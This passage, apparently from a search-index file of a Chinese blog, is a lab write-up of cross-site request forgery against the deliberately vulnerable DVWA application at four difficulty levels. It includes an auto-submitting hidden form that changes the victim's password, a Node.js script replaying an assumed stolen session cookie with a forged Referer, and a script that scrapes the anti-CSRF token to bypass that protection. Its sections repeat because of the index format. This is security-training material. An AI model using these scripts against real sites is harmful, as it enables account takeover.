\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f7f\u7528\u524d\u7aef\u4f2a\u9020\u8bf7\u6c42\u53ef\u80fd\u4f1a\u9047\u5230\u5404\u79cd\u969c\u788d\uff0c\u6211\u4eec\u5c31\u8003\u8651\u7528\u670d\u52a1\u7aef\u6765\u4f2a\u9020\u8bf7\u6c42\u3002\u800c\u4f7f\u7528\u670d\u52a1\u7aef\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528\u522b\u7684\u6f0f\u6d1e\u6765\u7a83\u53d6\u5230\u7528\u6237\u7684 Cookie \u3002 \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528DOM XSS\u6765\u7a83\u53d6\u7528\u6237\u7684 Cookie \uff0c\u8be6\u60c5\u53c2\u8003 \u7f51\u7edc\u5b89\u5168\u5165\u95e8\u4e4b\u8de8\u7ad9\u811a\u672c\u653b\u51fb DVWA XSS DOM Low to High \u8fd9\u4e00\u7bc7\u535a\u5ba2\u3002 \u90a3\u4e48\u5047\u8bbe\u6211\u4eec\u73b0\u5728\u5df2\u7ecf\u7a83\u53d6\u5230\u4e86\u7528\u6237\u7684Cookie \"security=medium; PHPSESSID=8jkvdfa07u9jgornta8862b9d0\" \u5728\u670d\u52a1\u7aef\u4f7f\u7528 Node.js \u7684 request\u7ec4\u4ef6 \u53d1\u9001HTTP\u8bf7\u6c42\u3002 var request = require('request'); const options = { url: 'http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:7147/web/vulnerabilities/csrf/?password_new=hackerPassword&password_conf=hackerPassword&Change=Change#', method: \"GET\", headers: { \"Content-Type\": \"text/html;charset=utf-8\", Referer: \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n2.vsgo.cloud\", Cookie: \"security=medium; PHPSESSID=8jkvdfa07u9jgornta8862b9d0\" } }; function callback(error, response, body) { if (!error && response.statusCode == 200) { console.log(\"Success\") // \u8bf7\u6c42\u6210\u529f\u7684\u5904\u7406\u903b\u8f91 console.log(body) // \u8bf7\u6c42\u6210\u529f\u7684\u5904\u7406\u903b\u8f91 console.log(typeof(body)) } else { console.log(\"Error\") // \u8bf7\u6c42\u5931\u8d25\u7684\u5904\u7406\u903b\u8f91 console.log(error) // \u8bf7\u6c42\u5931\u8d25\u7684\u5904\u7406\u903b\u8f91 } } var res = request(options, callback); \u4ece\u8fd4\u56de\u7684 HTML \u4e2d\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u5230\uff0c\u5bc6\u7801\u5df2\u7ecf\u6210\u529f\u88ab\u6211\u4eec\u4fee\u6539\u4e86\u3002 \\text{Figure 5. Medium} 3.3. High # High \u96be\u5ea6\u52a0\u5165\u4e86 Anti-CSRF token \u3002 <?php if( isset( $_GET[ 'Change' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' ); // Feedback for the user echo \"<pre>Password Changed.</pre>\"; } else { // Issue with passwords matching echo \"<pre>Passwords did not match.</pre>\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?> \u4e0d\u8fc7\u8fd9\u91cc\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u5c31\u662f token \u5b58\u5728\u4e86\u524d\u7aef\u4ee3\u7801\u4e2d\uff0c\u8fd9\u53c8\u7ed9\u4e86\u6211\u4eec\u7a83\u53d6 token \u7684\u673a\u4f1a\u3002 \\text{Figure 6. Token} \u540c\u6837\u5148\u62ff\u5230 Cookie \u3002 \"security=high; PHPSESSID=f3klut5ds454k782h5ea0prol5\" \u4f7f\u7528 Node.js \u5148\u53d1\u9001\u4e00\u6b21\u8bf7\u6c42\uff0c\u62ff\u5230 token \uff0c\u7136\u540e\u628a token \u52a0\u5165\u5230 GET \u8bf7\u6c42\u4e2d\uff0c\u518d\u53d1\u9001\u4e00\u6b21\u8bf7\u6c42\u3002 const cheerio = require('cheerio') const request = require('request'); var $; var tokenThis; var options = { url: 'http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:7147/web/vulnerabilities/csrf/', method: \"GET\", headers: { \"Content-Type\": \"text/html;charset=utf-8\", Referer: \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n2.vsgo.cloud\", Cookie: \"security=high; PHPSESSID=f3klut5ds454k782h5ea0prol5\" } }; function callback(error, response, body) { if (!error && response.statusCode == 200) { console.log(\"Success\") // \u8bf7\u6c42\u6210\u529f\u7684\u5904\u7406\u903b\u8f91 // \u83b7\u53d6html\u5bf9\u8c61 $ = cheerio.load(JSON.stringify(body)) // \u83b7\u53d6token tokenThis = $('input[name=\"user_token\"]').attr('value'); console.log(body) // \u8bf7\u6c42\u6210\u529f\u7684\u5904\u7406\u903b\u8f91 } else { console.log(\"Error\") // \u8bf7\u6c42\u5931\u8d25\u7684\u5904\u7406\u903b\u8f91 console.log(error) // \u8bf7\u6c42\u5931\u8d25\u7684\u5904\u7406\u903b\u8f91 } } // \u8bbe\u7f6e\u7b2c\u4e8c\u6b21\u8bf7\u6c42\u7684\u53c2\u6570 function setOpt() { var options2 = { url: 'http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:7147/web/vulnerabilities/csrf/?password_new=hackerPassword&password_conf=hackerPassword&Change=Change&user_token=' + tokenThis, method: \"GET\", headers: { \"Content-Type\": \"text/html;charset=utf-8\", Referer: \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n2.vsgo.cloud\", Cookie: \"security=high; PHPSESSID=f3klut5ds454k782h5ea0prol5\" } } return options2 }; // Node.js\u662f\u5f02\u6b65\u7684\uff0c\u6211\u4eec\u8fd9\u91cc\u9700\u8981\u540c\u6b65\u6267\u884c\u6240\u4ee5\u7528\u5230\u4e86Promise\u548cthen fn = ()=>{return new Promise( (resovle, reject) => { var res = resovle; request(options, (error, response, body) => { callback(error, response, body); res()\uff1b }); } ) } // \u540c\u6b65 fn().then( () => { request(setOpt(), callback); } ) \u4fee\u6539\u6210\u529f\u3002 \\text{Figure 7. High} 3.3. Impossible # Impossible \u96be\u5ea6\u52a0\u5165\u4e86\u539f\u5bc6\u7801\u7684\u6821\u9a8c\uff0c\u5728\u4e0d\u77e5\u9053\u539f\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u65e0\u6cd5\u5bf9\u5bc6\u7801\u8fdb\u884c\u4fee\u6539\uff0c\u8fd9\u6837\u662f\u6bd4\u8f83\u5b89\u5168\u7684\u3002 \\text{Figure 8. Impossible} <?php if( isset( $_GET[ 'Change' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_curr = $_GET[ 'password_current' ]; $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_curr ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_curr = md5( $pass_curr ); // Check that the current password is correct $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR ); $data->execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) { // It does! $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update database with new password $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); $data->bindParam( ':password', $pass_new, PDO::PARAM_STR ); $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data->execute(); // Feedback for the user echo \"<pre>Password Changed.</pre>\"; } else { // Issue with passwords matching echo \"<pre>Passwords did not match or current password incorrect.</pre>\"; } } // Generate Anti-CSRF token generateSessionToken(); ?> \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.DVWA CSRF All"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/4.DVWA_CSRF_All/#dvwa-xss-dom-all","text":"","title":"DVWA XSS DOM All"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/4.DVWA_CSRF_All/#_1","text":"DVWA XSS DOM All \u76ee\u5f55 1. \u80cc\u666f 2. \u73af\u5883\u642d\u5efa 3. \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 3.1. Low 3.2. Medium 3.3. High 3.3. Impossible","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/4.DVWA_CSRF_All/#1","text":"\u6700\u8fd1\u9700\u8981\u8865\u5145\u4e00\u4e0b\u7f51\u7edc\u5b89\u5168\u65b9\u9762\u7684\u77e5\u8bc6\uff0c\u4e8e\u662f\u5c31\u4ece\u57fa\u7840\u7684\u9776\u573a DVWA (Damn Vulnerable Web Application) \u5f00\u59cb\u5237\u8d77\uff0c\u8fd9\u4e00\u7bc7\u662f\u5173\u4e8e\u4ece Low \u5230 High \u96be\u5ea6\u7684\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u7684\u5185\u5bb9\u3002 \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/4.DVWA_CSRF_All/#2","text":"\u53c2\u8003\u4e0a\u4e00\u7bc7 \u5173\u4e8e Brute Force \u66b4\u529b\u7834\u89e3\u5bc6\u7801\u7684\u535a\u5ba2 \u3002","title":"2. \u73af\u5883\u642d\u5efa"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/4.DVWA_CSRF_All/#3","text":"\u6211\u4eec\u9700\u8981\u5728\u7528\u6237\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6539\u6389\u7528\u6237\u7684\u5bc6\u7801\u3002","title":"3. \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/4.DVWA_CSRF_All/#31-low","text":"\\text{Figure 1. CSRF} \u5148\u770b\u6e90\u7801\uff0c Low \u96be\u5ea6\u6ca1\u6709\u8bbe\u7f6e\u4efb\u4f55\u8bf7\u6c42\u6765\u6e90\u7684\u6821\u9a8c\u3002 <?php if( isset( $_GET[ 'Change' ] ) ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' ); // Feedback for the user echo \"<pre>Password Changed.</pre>\"; } else { // Issue with passwords matching echo \"<pre>Passwords did not match.</pre>\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?> \u53ea\u9700\u8981\u8ba9\u4ed6\u4eba\u70b9\u51fb\u4e0b\u9762\u7684\u94fe\u63a5\uff0c\u5bc6\u7801\u5c31\u4fee\u6539\u6210\u529f\u4e86\u3002 http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:7147/web/vulnerabilities/csrf/?password_new=hackerPassword&password_conf=hackerPassword&Change=Change# \u4e0d\u8fc7\u8fd9\u4e2a\u94fe\u63a5\u592a\u660e\u663e\u4e86\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u9875\u9762\u653e\u5728\u81ea\u5df1\u7684\u670d\u52a1\u5668\u4e0a\u3002 <!-- index.html --> <!DOCTYPE html> <html lang=\"zh\"> <head> <meta charset=\"UTF-8\"> <!-- for HTML5 --> <style> div { text-align: center; } </style> </head> <body> <div> <p> \u9875\u9762\u8df3\u8f6c\u4e2d\uff0c\u8bf7\u7a0d\u5019\u3002\u3002\u3002 </p> <style> form { display: none; } </style> <form action=\"http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:7147/web/vulnerabilities/csrf/\" method=\"GET\"> New password:<br /> <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_new\" value=\"hackerPassword\"><br /> Confirm new password:<br /> <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\" value=\"hackerPassword\"><br /> <br /> <input type=\"submit\" id=\"button\" name=\"Change\" value=\"Change\" /> </form> <script> document.getElementById(\"button\").click(); </script> </div> </body> </html> \u70b9\u51fb\u4ee5\u540e\u5c31\u4f1a\u53d1\u9001\u8bf7\u6c42\u6539\u53d8\u7528\u6237\u7684\u5bc6\u7801\u3002 \\text{Figure 2. Low}","title":"3.1. Low"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/4.DVWA_CSRF_All/#32-medium","text":"\u63a5\u4e0b\u6765\u662f Medium \u96be\u5ea6\uff0c\u5148\u770b\u6e90\u7801\u3002 <?php if( isset( $_GET[ 'Change' ] ) ) { // Checks to see where the request came from if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' ); // Feedback for the user echo \"<pre>Password Changed.</pre>\"; } else { // Issue with passwords matching echo \"<pre>Passwords did not match.</pre>\"; } } else { // Didn't come from a trusted source echo \"<pre>That request didn't look correct.</pre>\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?> \u8fd9\u91cc\u52a0\u5165\u4e86\u4e00\u4e2a\u6765\u6e90\u7684\u6821\u9a8c\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e00\u770b\u8fd9\u6bb5\u4ee3\u7801\u7684\u542b\u4e49 // Checks to see where the request came from if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) stripos \u51fd\u6570\uff1a stripos ( string $haystack , string $needle [, int $offset = 0 ] ) : int \u8fd4\u56de\u5728\u5b57\u7b26\u4e32 haystack \u4e2d needle \u9996\u6b21\u51fa\u73b0\u7684\u6570\u5b57\u4f4d\u7f6e\u3002 $_SERVER \u662f\u4e00\u4e2a\u5305\u542b\u4e86\u8bf8\u5982 \u5934\u4fe1\u606f(header) \u3001 \u8def\u5f84(path) \u3001\u4ee5\u53ca \u811a\u672c\u4f4d\u7f6e(script locations) \u7b49\u7b49\u4fe1\u606f\u7684\u6570\u7ec4\u3002\u8fd9\u4e2a\u6570\u7ec4\u4e2d\u7684\u9879\u76ee\u7531 Web \u670d\u52a1\u5668\u521b\u5efa\u3002 HTTP_REFERER \uff1a\u5f15\u5bfc\u7528\u6237\u4ee3\u7406\u5230\u5f53\u524d\u9875\u7684\u524d\u4e00\u9875\u7684\u5730\u5740\uff08\u5982\u679c\u5b58\u5728\uff09\u3002\u7531 user agent \u8bbe\u7f6e\u51b3\u5b9a\u3002\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7528\u6237\u4ee3\u7406\u90fd\u4f1a\u8bbe\u7f6e\u8be5\u9879\uff0c\u6709\u7684\u8fd8\u63d0\u4f9b\u4e86\u4fee\u6539 HTTP_REFERER \u7684\u529f\u80fd\u3002\u7b80\u8a00\u4e4b\uff0c\u8be5\u503c\u5e76\u4e0d\u53ef\u4fe1\u3002 SERVER_NAME \uff1a\u5f53\u524d\u8fd0\u884c\u811a\u672c\u6240\u5728\u7684\u670d\u52a1\u5668\u7684\u4e3b\u673a\u540d\u3002\u5982\u679c\u811a\u672c\u8fd0\u884c\u4e8e\u865a\u62df\u4e3b\u673a\u4e2d\uff0c\u8be5\u540d\u79f0\u662f\u7531\u90a3\u4e2a\u865a\u62df\u4e3b\u673a\u6240\u8bbe\u7f6e\u7684\u503c\u51b3\u5b9a\u3002 HTTP_REFERER \u4e0d\u80fd\u901a\u8fc7 jQuery \u8bf7\u6c42\u4f2a\u9020\u53d1\u9001\u3002 \\text{Figure 3. Set Header} \u4f7f\u7528 Ajax \u53d1\u9001\u8bf7\u6c42\u8fd8\u4f1a\u9047\u5230\u8de8\u57df\u95ee\u9898\u3002 \\text{Figure 4. CORS} \u4e5f\u5c31\u662f\u8bf4\uff0c\u4f7f\u7528\u524d\u7aef\u4f2a\u9020\u8bf7\u6c42\u53ef\u80fd\u4f1a\u9047\u5230\u5404\u79cd\u969c\u788d\uff0c\u6211\u4eec\u5c31\u8003\u8651\u7528\u670d\u52a1\u7aef\u6765\u4f2a\u9020\u8bf7\u6c42\u3002\u800c\u4f7f\u7528\u670d\u52a1\u7aef\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528\u522b\u7684\u6f0f\u6d1e\u6765\u7a83\u53d6\u5230\u7528\u6237\u7684 Cookie \u3002 \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528DOM XSS\u6765\u7a83\u53d6\u7528\u6237\u7684 Cookie \uff0c\u8be6\u60c5\u53c2\u8003 \u7f51\u7edc\u5b89\u5168\u5165\u95e8\u4e4b\u8de8\u7ad9\u811a\u672c\u653b\u51fb DVWA XSS DOM Low to High \u8fd9\u4e00\u7bc7\u535a\u5ba2\u3002 \u90a3\u4e48\u5047\u8bbe\u6211\u4eec\u73b0\u5728\u5df2\u7ecf\u7a83\u53d6\u5230\u4e86\u7528\u6237\u7684Cookie \"security=medium; PHPSESSID=8jkvdfa07u9jgornta8862b9d0\" \u5728\u670d\u52a1\u7aef\u4f7f\u7528 Node.js \u7684 request\u7ec4\u4ef6 \u53d1\u9001HTTP\u8bf7\u6c42\u3002 var request = require('request'); const options = { url: 'http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:7147/web/vulnerabilities/csrf/?password_new=hackerPassword&password_conf=hackerPassword&Change=Change#', method: \"GET\", headers: { \"Content-Type\": \"text/html;charset=utf-8\", Referer: \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n2.vsgo.cloud\", Cookie: \"security=medium; PHPSESSID=8jkvdfa07u9jgornta8862b9d0\" } }; function callback(error, response, body) { if (!error && response.statusCode == 200) { console.log(\"Success\") // \u8bf7\u6c42\u6210\u529f\u7684\u5904\u7406\u903b\u8f91 console.log(body) // \u8bf7\u6c42\u6210\u529f\u7684\u5904\u7406\u903b\u8f91 console.log(typeof(body)) } else { console.log(\"Error\") // \u8bf7\u6c42\u5931\u8d25\u7684\u5904\u7406\u903b\u8f91 console.log(error) // \u8bf7\u6c42\u5931\u8d25\u7684\u5904\u7406\u903b\u8f91 } } var res = request(options, callback); \u4ece\u8fd4\u56de\u7684 HTML \u4e2d\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u5230\uff0c\u5bc6\u7801\u5df2\u7ecf\u6210\u529f\u88ab\u6211\u4eec\u4fee\u6539\u4e86\u3002 \\text{Figure 5. Medium}","title":"3.2. Medium"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/4.DVWA_CSRF_All/#33-high","text":"High \u96be\u5ea6\u52a0\u5165\u4e86 Anti-CSRF token \u3002 <?php if( isset( $_GET[ 'Change' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' ); // Feedback for the user echo \"<pre>Password Changed.</pre>\"; } else { // Issue with passwords matching echo \"<pre>Passwords did not match.</pre>\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?> \u4e0d\u8fc7\u8fd9\u91cc\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u5c31\u662f token \u5b58\u5728\u4e86\u524d\u7aef\u4ee3\u7801\u4e2d\uff0c\u8fd9\u53c8\u7ed9\u4e86\u6211\u4eec\u7a83\u53d6 token \u7684\u673a\u4f1a\u3002 \\text{Figure 6. Token} \u540c\u6837\u5148\u62ff\u5230 Cookie \u3002 \"security=high; PHPSESSID=f3klut5ds454k782h5ea0prol5\" \u4f7f\u7528 Node.js \u5148\u53d1\u9001\u4e00\u6b21\u8bf7\u6c42\uff0c\u62ff\u5230 token \uff0c\u7136\u540e\u628a token \u52a0\u5165\u5230 GET \u8bf7\u6c42\u4e2d\uff0c\u518d\u53d1\u9001\u4e00\u6b21\u8bf7\u6c42\u3002 const cheerio = require('cheerio') const request = require('request'); var $; var tokenThis; var options = { url: 'http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:7147/web/vulnerabilities/csrf/', method: \"GET\", headers: { \"Content-Type\": \"text/html;charset=utf-8\", Referer: \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n2.vsgo.cloud\", Cookie: \"security=high; PHPSESSID=f3klut5ds454k782h5ea0prol5\" } }; function callback(error, response, body) { if (!error && response.statusCode == 200) { console.log(\"Success\") // \u8bf7\u6c42\u6210\u529f\u7684\u5904\u7406\u903b\u8f91 // \u83b7\u53d6html\u5bf9\u8c61 $ = cheerio.load(JSON.stringify(body)) // \u83b7\u53d6token tokenThis = $('input[name=\"user_token\"]').attr('value'); console.log(body) // \u8bf7\u6c42\u6210\u529f\u7684\u5904\u7406\u903b\u8f91 } else { console.log(\"Error\") // \u8bf7\u6c42\u5931\u8d25\u7684\u5904\u7406\u903b\u8f91 console.log(error) // \u8bf7\u6c42\u5931\u8d25\u7684\u5904\u7406\u903b\u8f91 } } // \u8bbe\u7f6e\u7b2c\u4e8c\u6b21\u8bf7\u6c42\u7684\u53c2\u6570 function setOpt() { var options2 = { url: 'http://9710fc76520cf9b2ff5ea67e0af9e0df.n1.vsgo.cloud:7147/web/vulnerabilities/csrf/?password_new=hackerPassword&password_conf=hackerPassword&Change=Change&user_token=' + tokenThis, method: \"GET\", headers: { \"Content-Type\": \"text/html;charset=utf-8\", Referer: \"http://9710fc76520cf9b2ff5ea67e0af9e0df.n2.vsgo.cloud\", Cookie: \"security=high; PHPSESSID=f3klut5ds454k782h5ea0prol5\" } } return options2 }; // Node.js\u662f\u5f02\u6b65\u7684\uff0c\u6211\u4eec\u8fd9\u91cc\u9700\u8981\u540c\u6b65\u6267\u884c\u6240\u4ee5\u7528\u5230\u4e86Promise\u548cthen fn = ()=>{return new Promise( (resovle, reject) => { var res = resovle; request(options, (error, response, body) => { callback(error, response, body); res()\uff1b }); } ) } // \u540c\u6b65 fn().then( () => { request(setOpt(), callback); } ) \u4fee\u6539\u6210\u529f\u3002 \\text{Figure 7. High}","title":"3.3. High"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/4.DVWA_CSRF_All/#33-impossible","text":"Impossible \u96be\u5ea6\u52a0\u5165\u4e86\u539f\u5bc6\u7801\u7684\u6821\u9a8c\uff0c\u5728\u4e0d\u77e5\u9053\u539f\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u65e0\u6cd5\u5bf9\u5bc6\u7801\u8fdb\u884c\u4fee\u6539\uff0c\u8fd9\u6837\u662f\u6bd4\u8f83\u5b89\u5168\u7684\u3002 \\text{Figure 8. Impossible} <?php if( isset( $_GET[ 'Change' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_curr = $_GET[ 'password_current' ]; $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_curr ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_curr = md5( $pass_curr ); // Check that the 